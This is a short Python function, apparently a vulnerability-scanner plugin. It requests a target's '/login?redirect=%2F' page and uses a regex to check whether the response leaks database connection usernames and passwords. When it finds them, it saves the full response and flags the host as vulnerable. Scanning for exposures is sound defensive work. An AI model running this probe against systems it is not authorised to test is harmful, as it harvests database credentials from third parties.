def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/login?redirect=%2F'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'jsonData.*?dbConnection.*?password.*?username.*?}',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret